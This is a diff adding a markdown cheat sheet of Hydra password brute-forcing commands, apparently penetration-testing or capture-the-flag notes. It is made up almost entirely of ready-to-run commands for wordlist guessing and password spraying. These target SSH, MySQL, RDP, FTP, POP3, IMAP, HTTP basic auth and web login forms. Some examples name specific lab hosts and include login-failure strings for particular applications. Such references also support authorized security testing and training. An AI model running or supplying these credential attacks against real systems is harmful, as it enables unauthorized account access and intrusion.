@@ -1,0 +1,28 @@
+## Start Hydra's wizard:
+hydra-wizard
+
+## Examples
+### Single/Known User
+hydra -l {{username}} -P {{path/to/wordlist.txt}} {{host_ip}} {{ssh}}
+hydra -l {{username}} -P {{path/to/wordlist.txt}} -f {{host_ip}} {{mysql}}
+hydra -l {{username}} -P {{path/to/wordlist.txt}} -V {{rdp://host_ip}}
+
+hydra -l george -P ./rockyou.txt -s 2222 ssh://192.168.192.201
+#### May have to use burpesuite to capture full url w/ parameters
+hydra -l harvey -P /usr/share/wordlists/rockyou.txt internal-01.bart.htb http-form-post "/simple_chat/login.php:uname=^USER^&passwd=^PASS^&submit=login:Invalid Username or Password"      
+sudo hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
+hydra -l admin -P darkweb2017-top10K.txt 10.10.10.75 http-post-form "/nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username"
+
+### Password Spray / Unknown user
+hydra -L {{path/to/usernames.txt}} -P {{path/to/wordlist.txt}} {{host_ip}} {{https-post-form}} "{{url_without_host}}:{{https_post_request}}:{{login_failed_string}}"
+hydra -L {{path/to/usernames.txt}} -P {{path/to/wordlist.txt}} -M {{path/to/hosts.txt}} -F {{pop3}}
+hydra -L {{path/to/usernames.txt}} -P {{path/to/wordlist.txt}} -t {{n_tasks}} {{host_ip}} {{ftp}}
+
+hydra -L /usr/share/nmap/nselib/data/usernames.lst -P /usr/share/nmap/nselib/data/passwords.lst -u -e s -s 25 192.168.0.15 ftp
+
+hydra -C {{path/to/username_password_pairs.txt}} {{imap://[host_range_cidr]}}
+
+# Basic Auth
+hydra -l admin -P rockyou.txt http-get://{{url}}
+hydra -L user_list.txt -P rockyou.txt -u -e ns http-get://{{url}} (tries empty password and username -u -e ns)
+hydra -L user_list.txt -P rockyou.txt  http-get://{{url}} -m Cookie={{cookie}}
